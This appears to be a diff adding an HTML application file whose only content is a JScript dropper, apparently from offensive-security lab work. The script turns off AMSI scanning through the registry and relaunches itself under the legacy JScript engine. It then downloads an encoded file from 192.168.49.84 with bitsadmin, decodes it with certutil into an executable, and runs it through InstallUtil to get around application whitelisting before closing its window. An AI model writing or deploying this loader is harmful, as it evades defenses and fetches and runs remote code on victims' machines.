@@ -1,0 +1,26 @@
+<html>
+<head>
+<script language="JScript">
+var sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
+try{
+    var AE = sh.RegRead(key);
+    if(AE!=0){
+        throw new Error(1, '');
+    }
+}catch(e){
+    sh.RegWrite(key, 0, "REG_DWORD");
+    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName,0,1);
+    sh.RegWrite(key, 1,"REG_DWORD");
+    WScript.Quit(1);
+}
+bts = "cmd /k bitsadmin /Transfer job http://192.168.49.84/b.txt C:\\Windows\\Temp\\b.txt && certutil -decode C:\\Windows\\Temp\\b.txt C:\\Windows\\Temp\\b.exe && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Temp\\b.exe"
+sh.run(bts);
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
